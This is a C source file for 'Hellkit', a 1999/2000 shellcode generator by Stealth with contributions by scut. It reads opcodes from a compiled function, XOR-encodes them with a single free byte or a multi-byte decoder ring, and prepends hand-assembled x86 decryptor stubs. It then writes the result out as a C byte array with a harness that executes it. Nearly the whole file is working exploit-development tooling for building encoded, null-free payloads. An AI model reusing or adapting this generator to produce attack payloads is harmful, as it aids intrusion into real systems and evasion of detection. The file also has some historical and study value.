/*** Hellkit -- Stealth's own patented shellcode-generator.
 *** (C) 1999/2000 by Stealth. You may use it under the terms of
 *** the GPL.
 ***
 ***/
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <errno.h>

#define	VERSION	"1.2"

/* the opcode-array */
extern unsigned char	opcode[];

/* how many opcodes in array */
extern int j;		

/* name of the function, the opcode-list is generated for */	
extern char	hellfunction[];

FILE *hell;

unsigned char *	create_byte_decryptor (unsigned char *, int, unsigned char);
unsigned char *	create_word_decryptor (unsigned char *, int, unsigned char);
unsigned char *	create_generic_decryptor (unsigned char *, int);


int
main (int argc, char **argv)
{
	srand(time(NULL));

	printf("Stealth's supa-dupa hellcode-generator. Double head-kick edition.\n\n");
	if (argc < 2) {
		printf("Usage: %s <hellcode-output-file> [hell-function]\n", argv[0]);
		exit(1);
	}
	if (argc < 3) {
		printf("Warning: defaulting hell-function to 'main'.\n\n");
		strcpy (hellfunction, "main");
	} else
		strcpy(hellfunction, argv[2]);
	if ((hell = fopen(argv[1], "w+")) == NULL) {
		perror("fopen");
		exit(errno);
	}
	yylex();
	fclose(hell);

	return 0;
}


int
yywrap()
{
	int		i = 0,
			zero[256],
			shellcode_offset = 0;
	unsigned char	c,
			kb = 0;
	unsigned char *	shellcode = NULL;
        
	memset(zero, 0, 256*sizeof(int));
	
	/* count each byte */
	for (i = 0; i < j; i++) {
		c = opcode[i];
		zero[c]++;
	}
        
	/* find free bytes for encryption */
	for (i = 1; i < 256; i++) {
		if (zero[i] == 0) {
			kb = i;
                        break;
		}
	}

	if (kb) {
		printf("found unused byte '\\x%02x' for encoding\n", kb);
                if (j < 256) {
                   	shellcode = create_byte_decryptor(opcode, j, kb);

                        /* offset in shellcode where real hellcode begins 
                         * all bytes below this offset belong to decryptor
                         */
                        shellcode_offset = 23;
                } else {
                   	shellcode = create_word_decryptor(opcode, j, kb);
                        shellcode_offset = 25;
                }
        } else {
		printf("found no single byte for encryption, using generic generator\n");
                shellcode = create_generic_decryptor (opcode, j);
		shellcode_offset = strlen ((char *) shellcode);

		/* make the rest of the code belief that there is no encoded
		 * data, since it is already included within the decoder
		 * itself. -sc
		 */
		j = 0;
        }
        
	fprintf(hell, "/*** Generated by Stealth's hellkit v"VERSION"\n *** Don't edit!\n ***/\n");

	/* write out decryptor */
	fprintf(hell, "\nunsigned char hell[] =\n\"");
	for (i = 0; i < shellcode_offset; i++) {
		 c = shellcode[i];
		 fprintf(hell, "\\x%02x", c);
	}
	fprintf(hell, "\"\n\"");
		 
	/* in case this isn't a generic decryptor encode the rest of the
	 * shellcode, else just skip this
	 */
	for (i = shellcode_offset; i < j + shellcode_offset; i++) {
		c = shellcode[i];
                
                /* encrypt! */
		c ^= kb;
                
		fprintf(hell, "\\x%02x", c);
		
		/* break into newline if too long */
		if ((i % 19) == 0) 
			fprintf(hell, "\"\n\"");
	}
	fprintf(hell, "\";\n");
	
	/* give her a dummy-main function */
	fprintf(hell, "int main()\n{\n\tint (*f)();\n\t"
	              "f = hell;\n\t"
		      "printf(\"%cd\\n\", strlen(hell));\n\t"
		      "f();\n}\n", '%');
	return 1;
}


/* create a decryptor for shellcodes < 256 bytes
 * the shellcode will not be encrypted, this must be done
 * by the caller
 */
unsigned char *
create_byte_decryptor (unsigned char * code, int len, unsigned char key_byte)
{
	unsigned char	d[] =
		"\xeb\x3"
		"\x5e"
		"\xeb\x05"
		"\xe8\xf8\xff\xff\xff"
		"\x83\xc6\x0d"
		"\x31\xc9"
		"\xb1\x0b"
		"\x80\x36\x4d"
		"\x46"
		"\xe2\xfa";

        int		crypt_byte_offset = 19,
			ecx_init_offset = 16,
			i = 0; 
        unsigned char *	ret;
        
	ret = calloc (1, len + strlen ((char *) d));

        if (ret == NULL) {
           	perror("malloc");
                exit(errno);
        }

        memcpy (ret, d, strlen ((char *) d));
        ret[crypt_byte_offset] = key_byte;
        ret[ecx_init_offset] = (unsigned char)len;

        for (i = 0 ; i < len ; ++i) {
           	ret[strlen ((char *) d) + i] = code[i];
	}

        return (ret);
}

/* same as above but for shellcodes > 256 bytes
 */
unsigned char *
create_word_decryptor (unsigned char * code, int len, unsigned char key_byte)
{
	unsigned char	d[] =
		"\xeb\x03"
		"\x5e"
		"\xeb\x05"
		"\xe8\xf8\xff\xff\xff"
		"\x83\xc6\x0f"
		"\x31\xc9"
		"\x66\xb9\x62\x04"
		"\x80\x36\x4d"
		"\x46"
		"\xe2\xfa";
        int		crypt_byte_offset = 21,
			ecx_init_offset = 17,
			i = 0;
	unsigned char *	ret;
        
	ret = calloc (1, len + strlen ((char *) d));
	if (ret == NULL) {
		perror("malloc");
		exit(errno);
	}

        memcpy(ret, d, strlen ((char *) d));
        ret[crypt_byte_offset] = key_byte;
        *((unsigned short int *)&ret[ecx_init_offset]) =
		(unsigned short int) len;
        
        for (i = 0; i < len; i++) {
           	ret[strlen ((char *) d) + i] = code[i];
	}

        return (ret);
}

/* generic arbitrary length (up to 64kb) arbitrary byte generator -sc.
 */
unsigned char *
create_generic_decryptor (unsigned char * code, int len)
{
	/* 40 byte decoding shellcode by scut
	 */
	char d[] = "\xeb\x22"			/* jmp   24 */
		   "\x5e"			/* popl  %esi */
		   "\x89\xf7"			/* movl  %esi,%edi */
		   "\x31\xc9"			/* xorl  %ecx,%ecx */
		   "\x66\x49"			/* decw  %cx */
	/* XXX */  "\x66\x81\xe9\xea\xff"	/* subw  $(0xffff - sc_len), %cx */
		   "\x01\xce"			/* addl  %ecx,%esi */
		   "\x89\xf5"			/* movl  %esi,%ebp */
	/* XXX */  "\xb3\x02"			/* movb  $ringlen,%bl */
		   "\xac"			/* lodsb %ds:(%esi),%al */
		   "\x30\x07"			/* xorb  %al,(%edi) */
		   "\x47"			/* incl  %edi */
		   "\xfe\xcb"			/* decb  %bl */
		   "\x75\xf8"			/* jne   14 */
		   "\x89\xee"			/* movl  %ebp,%esi */
	/* XXX */  "\xb3\x02"			/* movb  $ringlen,%bl */
		   "\xe2\xf2"			/* loop  14 */
		   "\xeb\x05"			/* jmp   29 */
		   "\xe8\xd9\xff\xff\xff";	/* call  2 */

	int		offset_sclen = 12;
	int		offset_ringlen1 = 19;
	int		offset_ringlen2 = 31;

	int		ring_len = 0;
	unsigned char	ring[256];	/* decoding ring */
	unsigned char *	ret;
	unsigned char *	wp;

	int		allok,		/* temporary variables */
			i,
			n,
			rlet;
	int		carr[256];	/* temporary helper array */


	memset (ring, '\x00', sizeof (ring));

	/* this may look brain dead, but believe me it is not. -scut
	 */
	do {
		ring_len++;
		if (ring_len >= 256) {
			printf ("ring size exceeded, bailing out\n");
			exit (EXIT_FAILURE);
		}

		allok = 0;	/* assume everything is alright */

		memset (ring, '\x00', sizeof (ring));

		for (i = 0 ; i < ring_len ; ++i) {
			for (n = 0 ; n < 256 ; ++n)
				carr[n] = 0;
			for (rlet = i ; rlet < len ; ) {
				carr[(unsigned int) code[rlet]] += 1;
				rlet += ring_len;
			}
			for (n = 1 ; n < 256 ; ++n) {
				if (carr[n] == 0 && ring[i] == '\x00') {
					ring[i] = (unsigned char) n;
				}
			}
			if (ring[i] == '\x00')
				allok++;
		}
	} while (allok != 0);

	printf ("using generic code with decoder ring size of %d %s\n",
		ring_len, (ring_len == 1) ? "byte" : "bytes");

	/* construct decoder with payload, phear
	 */
	ret = calloc (1, strlen (d) + len + ring_len);
	if (ret == NULL) {
           	perror ("malloc");
                exit (EXIT_FAILURE);
	}

	memcpy (ret, d, strlen (d));
	ret[offset_sclen] = (char) ((~len) & 0xff);
	ret[offset_sclen+1] = (char) (((~len) >> 8) & 0xff);
	ret[offset_ringlen1] = (char) ring_len;
	ret[offset_ringlen2] = (char) ring_len;
	wp = ret + strlen ((char *) ret);
	memcpy (ret + strlen ((char *) ret), code, len);

	printf ("encoding shellcode\n");

	for (i = 0 ; i < ring_len ; ++i) {
		for (rlet = i ; rlet < len ; rlet += ring_len) {
			wp[rlet] ^= ring[i];
		}
	}

	printf ("appending %d byte ring to payload\n", ring_len);
	memcpy (wp + len, ring, ring_len);

	return (ret);
}


